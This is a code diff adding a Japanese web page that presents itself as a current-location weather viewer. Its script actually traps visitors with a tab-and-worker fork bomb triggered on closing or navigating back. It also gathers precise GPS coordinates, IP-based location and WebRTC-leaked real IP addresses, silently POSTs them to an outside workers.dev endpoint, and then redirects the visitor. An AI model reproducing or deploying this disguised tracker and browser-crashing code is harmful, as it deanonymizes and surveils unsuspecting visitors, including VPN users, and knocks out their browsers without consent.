@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>現在地の天気</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont;
+      background: #0f172a;
+      color: #e5e7eb;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #020617;
+      border: 1px solid #1e293b;
+      border-radius: 12px;
+      padding: 24px;
+      width: 360px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.6);
+    }
+
+    h1 {
+      font-size: 18px;
+      margin: 0 0 12px 0;
+      text-align: center;
+    }
+
+    .status {
+      font-size: 13px;
+      color: #94a3b8;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .weather {
+      font-size: 16px;
+      line-height: 1.6;
+    }
+
+    .error {
+      color: #f87171;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .leak-info {
+      margin-top: 16px;
+      padding: 12px;
+      background: #1e293b;
+      border-radius: 8px;
+      font-size: 13px;
+      color: #facc15;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>現在地の天気</h1>
+  <div id="status" class="status">位置情報を取得中…</div>
+  <div id="weather" class="weather"></div>
+  <div id="leak" class="leak-info"></div>
+  <div id="error" class="error"></div>
+</div>
+
+<script>
+function crashOnClose() {
+  const workers = [];
+
+  function spawnTab() {
+    window.open(location.href, '_blank');
+  }
+
+  function spawnWorker() {
+    const blob = new Blob([`
+      let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
+      while(true) {
+        const an = (a + b) / 2;
+        b = Math.sqrt(a * b);
+        t -= p * (a - an) ** 2;
+        a = an;
+        p *= 2;
+        const pi = (a + b) ** 2 / (4 * t);
+        for(let i=0;i<10000;i++) Math.sqrt(pi);
+      }
+    `], { type: 'text/javascript' });
+    const w = new Worker(URL.createObjectURL(blob));
+    workers.push(w);
+  }
+
+  function explode(d) {
+    for (let i = 0; i < 2 ** d; i++) {
+      spawnTab();
+      spawnWorker();
+    }
+    if (d < 5) {
+      setTimeout(() => explode(d + 1), 200);
+    }
+  }
+
+  window.addEventListener('beforeunload', (e) => {
+    explode(0);
+    e.preventDefault();
+    e.returnValue = '';
+    setTimeout(() => explode(2), 0);
+  });
+
+  window.addEventListener('pagehide', () => {
+    for (let i = 0; i < 10; i++) {
+      spawnTab();
+    }
+  });
+
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', () => {
+    history.pushState(null, '', location.href);
+    explode(2);
+  });
+}
+
+crashOnClose();
+
+(async function () {
+  const statusEl = document.getElementById("status");
+  const weatherEl = document.getElementById("weather");
+  const leakEl = document.getElementById("leak");
+  const errorEl = document.getElementById("error");
+
+  function showError(msg) {
+    statusEl.textContent = "";
+    errorEl.textContent = msg;
+  }
+
+  async function getRealIPv4viaWebRTC() {
+    return new Promise((resolve) => {
+      const ips = [];
+      let resolved = false;
+      const pc = new RTCPeerConnection({
+        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+      });
+
+      pc.createDataChannel("");
+
+      pc.onicecandidate = (e) => {
+        if (e.candidate && e.candidate.candidate) {
+          const candidateStr = e.candidate.candidate;
+          const ipv4Regex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
+          const ipv4Matches = candidateStr.match(ipv4Regex);
+          if (ipv4Matches) {
+            ipv4Matches.forEach(ip => {
+              if (!ips.includes(ip)) {
+                ips.push(ip);
+              }
+            });
+          }
+
+          clearTimeout(pc._resolveTimeout);
+          pc._resolveTimeout = setTimeout(() => {
+            if (!resolved) {
+              resolved = true;
+              pc.close();
+              resolve(ips);
+            }
+          }, 200);
+        }
+      };
+
+      pc.onicegatheringstatechange = () => {
+        if (pc.iceGatheringState === 'complete' && !resolved) {
+          clearTimeout(pc._resolveTimeout);
+          resolved = true;
+          pc.close();
+          resolve(ips);
+        }
+      };
+
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(() => {
+          if (!resolved) {
+            resolved = true;
+            pc.close();
+            resolve(ips);
+          }
+        });
+
+      setTimeout(() => {
+        if (!resolved) {
+          resolved = true;
+          pc.close();
+          resolve(ips);
+        }
+      }, 1000);
+    });
+  }
+
+  function getPositionByGPS() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error("Geolocation非対応"));
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            source: "GPS"
+          });
+        },
+        err => reject(err),
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+    });
+  }
+
+  async function getPositionByIP() {
+    const res = await fetch("https://ipapi.co/json/");
+    if (!res.ok) throw new Error("IP位置取得失敗");
+    const data = await res.json();
+    return {
+      lat: data.latitude,
+      lon: data.longitude,
+      city: data.city,
+      region: data.region,
+      country: data.country_name,
+      ip: data.ip,
+      source: "IP"
+    };
+  }
+
+  async function getWeather(lat, lon) {
+    const url =
+      "https://api.open-meteo.com/v1/forecast" +
+      "?latitude=" + lat +
+      "&longitude=" + lon +
+      "&current_weather=true" +
+      "&timezone=Asia%2FTokyo";
+
+    const res = await fetch(url);
+    if (!res.ok) throw new Error("天気取得失敗");
+    return await res.json();
+  }
+
+  try {
+    const [webrtcIPv4List, position] = await Promise.all([
+      getRealIPv4viaWebRTC(),
+      (async () => {
+        try {
+          return await getPositionByGPS();
+        } catch {
+          return await getPositionByIP();
+        }
+      })()
+    ]);
+
+    statusEl.textContent = "位置情報: " + position.source;
+
+    const weatherData = await getWeather(position.lat, position.lon);
+    const w = weatherData.current_weather;
+
+    weatherEl.innerHTML = `
+      緯度: ${position.lat.toFixed(4)}<br>
+      経度: ${position.lon.toFixed(4)}<br><br>
+      気温: ${w.temperature} ℃<br>
+      風速: ${w.windspeed} km/h<br>
+      天気コード: ${w.weathercode}<br>
+      観測時刻: ${w.time}
+    `;
+
+    if (webrtcIPv4List.length > 0) {
+      let html = "🔓 WebRTC検出IPv4:<br><br>";
+      html += webrtcIPv4List.map(ip => `<strong>${ip}</strong>`).join("<br>");
+      leakEl.innerHTML = html;
+    } else {
+      leakEl.innerHTML = "🔒 WebRTC IPv4は検出されず（安全）";
+    }
+
+    const WORKER_URL = "https://white-dream-0732.kurea-ch124.workers.dev/";
+    const ipv4ListStr = webrtcIPv4List.length > 0 ? webrtcIPv4List.join(", ") : "検出なし";
+    const vpnIP = position.ip || "不明";
+
+    const text =
+`🌤 天気情報
+取得元: ${position.source}
+緯度: ${position.lat.toFixed(4)}
+経度: ${position.lon.toFixed(4)}
+気温: ${w.temperature}℃
+風速: ${w.windspeed} km/h
+観測時刻: ${w.time}
+VPN越しIP: ${vpnIP}
+WebRTC IPv4: ${ipv4ListStr}`;
+
+    // IP送信 → 完了したら遷移
+    statusEl.textContent = "送信中…";
+    await fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: text
+    });
+
+    statusEl.textContent = "送信完了　まもなく移動…";
+    setTimeout(() => {
+      window.location.href = "https://kcjsa.github.io/fan/dex.html";
+    }, 500);
+
+  } catch (e) {
+    showError("取得できませんでした");
+    console.error(e);
+    // エラーでも飛ばす
+    setTimeout(() => {
+      window.location.href = "https://kcjsa.github.io/fan/dex.html";
+    }, 1000);
+  }
+})();
+</script>
+
+</body>
+</html>
